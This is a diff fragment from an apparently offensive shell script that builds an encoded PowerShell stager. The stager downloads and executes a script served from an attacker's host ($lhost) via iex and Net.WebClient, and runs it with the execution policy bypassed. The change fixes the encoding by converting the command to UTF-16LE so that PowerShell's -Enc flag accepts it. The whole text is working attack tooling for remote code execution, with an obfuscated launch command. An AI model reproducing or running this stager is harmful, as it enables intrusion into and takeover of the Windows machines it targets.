@@ -66,7 +66,7 @@ echo "$func" >> /var/www/plugin
 #base64 encode the stager scriptblock
 scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$lhost/plugin")"
 echo "The stager command is $scriptblock"
-encode="`echo $scriptblock | base64 -w 0`"
+encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
 echo "The encoded scriptblock is $encode"
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo "The commandline syntax is $command"
